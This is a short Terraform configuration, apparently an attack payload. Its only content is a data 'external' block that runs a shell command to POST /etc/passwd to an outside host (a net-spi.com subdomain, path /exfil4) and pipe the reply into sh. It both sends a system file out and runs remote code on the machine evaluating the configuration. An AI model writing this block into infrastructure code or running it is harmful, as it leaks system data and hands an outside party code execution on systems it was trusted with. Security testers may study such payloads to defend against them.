data "external" "example" { 
  program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd https://qa4ua484l6dk3wk1hwatm61f46ayyqmf.net-spi.com/exfil4 | sh"] 
} 
